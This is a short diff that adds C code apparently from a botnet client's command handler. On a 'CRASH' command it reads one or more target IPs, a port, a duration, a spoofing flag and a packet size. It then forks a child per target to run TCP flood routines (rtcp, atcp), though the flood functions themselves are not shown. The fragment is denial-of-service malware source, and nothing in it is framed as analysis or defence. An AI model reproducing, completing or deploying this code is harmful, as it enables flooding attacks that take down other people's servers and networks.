@@ -1,0 +1,35 @@
+  if(!strcmp(argv[0], "CRASH"))
+        {
+                if(argc < 6)
+                {
+
+                        return;
+                }
+
+                unsigned char *ip = argv[1];
+                int port = atoi(argv[2]);
+                int time = atoi(argv[3]);
+                int spoofed = atoi(argv[4]);
+
+                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
+                int psize = argc > 5 ? atoi(argv[5]) : 0;
+
+                if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *ip = strtok(ip, ",");
+                        while(ip != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        rtcp(ip, port, time, spoofed, psize, pollinterval);
+                                        _exit(0);
+                                }
+                                ip = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
+
+                        atcp(ip, port, time, spoofed, psize, pollinterval);
+                        _exit(0);
+                }
+        }
